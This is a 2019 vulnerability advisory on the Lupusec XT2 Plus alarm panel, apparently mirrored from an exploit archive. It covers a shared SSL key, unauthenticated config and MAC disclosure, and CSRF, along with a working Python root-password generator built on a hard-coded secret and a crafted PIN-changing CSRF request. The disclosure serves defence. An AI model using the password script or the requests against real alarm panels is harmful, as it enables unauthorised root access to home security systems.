@@ -1,0 +1,100 @@
+id: 32497
+date: 04/07/2019
+title: Lupusec XT2 Plus Main Panel Shared Secrets / Secret Disclosure / CSRF Vulnerabilities
+author: Dan Fabian
+cves: 
+
+=======================================================================
+              title: Multiple Vulnerabilities
+            product: Lupusec XT2 Plus Main Panel
+            version: Firmware 0.0.2.19E
+           homepage: https://www.lupus-electronics.de/
+              found: 01/2019
+                 by: D. Fabian
+=======================================================================
+
+Vendor description:
+-------------------
+"The new LUPUSEC-XT2 Plus is an innovative burglar alarm, smart home,
+and video surveillance system that is reliable, easy to use, and
+extremely versatile. It is the operating system for your building."
+
+Source:
+https://www.lupus-electronics.de/shop/en/Alarm-Smarthome/Centrals/LUPUSEC-XT2-Plus-Main-Panel-p.html
+
+
+Vulnerability description:
+-----------------------------------
+1) Shared SSL certificate
+All devices share the same SSL key. Anyone who is capable of
+downloading the firmware off the internet can perform a MITM attack.
+
+
+2) Root password derived from MAC address
+While the root password is unique per device, it is derived from the
+MAC address and can be fairly easily calculated off a hard-coded
+secret. The panel runs a telnet server on port 55023, where the
+calculated root password works. Additionally
+https://alarm/action/welcomeGet discloses the MAC address without
+authentication over the web interface. In combination, all of this is
+sufficient to authenticate as root to any XT2 device exposed directly
+on the internet.
+
+The below small Python script returns the root password for the given
+MAC address.
+
+import hashlib
+import sys
+
+mac = "001122aabbcc" # MAC address without colons in all lowercase
+x = "7jBhPZVbCJMrS9qg6KtxzHR5T2dk3NmvQ4WDywFsYpXnc8Gf"
+y = "5156" + mac + "2759"
+digest = hashlib.sha256()
+digest.update(y)
+z = digest.digest()
+sys.stdout.write(x[ord(z[5]) % len(x)])
+sys.stdout.write(x[ord(z[7]) % len(x)])
+sys.stdout.write(x[ord(z[28]) % len(x)])
+sys.stdout.write(x[ord(z[6]) % len(x)])
+sys.stdout.write(x[ord(z[24]) % len(x)])
+sys.stdout.write(x[ord(z[15]) % len(x)])
+sys.stdout.write(x[ord(z[13]) % len(x)])
+sys.stdout.write(x[ord(z[16]) % len(x)])
+
+sys.stdout.flush()
+
+
+3) Configuration including passwords downloadable without authentication
+If the configuration of the device has been exported since the
+previous reboot, it can be downloaded without authentication via
+https://alarm/temp/config.tar.gz. The configuration contains PINs,
+user passwords, and all other configuration settings. Passwords and
+PINs are "encrypted" using a simple substitution cipher.
+
+
+4) XML API vulnerable to CSRF
+The XML API accepts requests via both GET and POST, and does not
+require CSRF tokens. E.g. the following request sets the PIN of user 5
+to 4444. The MAC address is publicly disclosed via the web interface
+per issue #2.
+
+https://alarm/action/xmlCmd?strXML=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0A%3Cp%3E%0A++%3Cmac+v%3D%2200%3A11%3A22%3A33%3A44%3A44%22%2F%3E%0A++%3Ccmds%3E%0A%3Ccmd+a%3D%22setUser%22%3E%0A%3Carea+v%3D%221%22%2F%3E%0A%3Cno+v%3D%225%22%2F%3E%0A%3Ccode+v%3D%224444%22%2F%3E%0A%3Cname+v%3D%22test%22%2F%3E%0A%3Clatch+v%3D%220%22%2F%3E%0A%3C%2Fcmd%3E%0A++%3C%2Fcmds%3E%0A%3C%2Fp%3E
+
+
+Vendor contact timeline:
+------------------------
+2019-01-09: Contacted the vendor
+2019-01-09: Vendor reply saying that the issues are known and should be fixed
+            in the new firmware release.
+2019-03-26: Vendor reply saying the new firmware was released
+
+
+Solution:
+---------
+Per the vendor’s recommendation, update the firmware to version v0.0.3.0.
+
+Note that I didn’t verify whether the issues are indeed resolved in
+the new version. Either way it’s probably a good idea to only expose
+the device through a VPN.
+
+#  0day.today [2023-03-24]  #
